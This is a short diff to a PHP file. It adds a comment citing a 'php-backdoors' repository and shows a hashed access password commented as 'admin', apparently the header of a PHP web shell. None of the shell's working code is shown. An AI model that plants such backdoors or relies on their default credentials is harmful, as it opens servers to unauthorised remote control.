@@ -1,4 +1,5 @@
 <?php
+// from https://github.com/1337r0j4n/php-backdoors
 
 $s_pass = "90b9aa7e25f80cf4f64e990b78a9fc5ebd6cecad"; // password : admin
 
